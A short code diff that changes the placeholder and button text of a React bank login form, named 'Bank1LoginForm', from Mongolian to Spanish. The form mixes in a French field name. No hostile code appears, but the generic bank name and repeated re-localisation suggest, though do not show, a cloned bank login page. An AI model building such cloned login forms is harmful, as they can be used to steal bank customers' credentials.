@@ -80,7 +80,7 @@ export default function Bank1LoginForm() {
               name="username"
               id="username"
               className="w-full px-4 py-3 text-lg border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:border-green-500 focus:ring-1 focus:ring-green-500"
-              placeholder="Нэвтрэх нэр"
+              placeholder="Número celular"
               required
               disabled={isLoading}
             />
@@ -93,7 +93,7 @@ export default function Bank1LoginForm() {
               id="password"
               name="motdepasse"
               className="w-full px-4 py-3 text-lg border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:border-green-500 focus:ring-1 focus:ring-green-500 pr-12"
-              placeholder="Нууц уг"
+              placeholder="contraseña"
               required
               disabled={isLoading}
             />
@@ -111,7 +111,7 @@ export default function Bank1LoginForm() {
             disabled={isLoading}
             className="w-full py-3 px-4 bg-green-600 hover:bg-green-700 text-white font-bold text-lg rounded-lg shadow hover:shadow-md transition-all disabled:opacity-50 disabled:cursor-not-allowed"
           >
-            {isLoading ? 'Chargement...' : 'Нэгдэх'}
+            {isLoading ? 'cargando...' : 'Entrar'}
           </button>
         </form>
       </div>
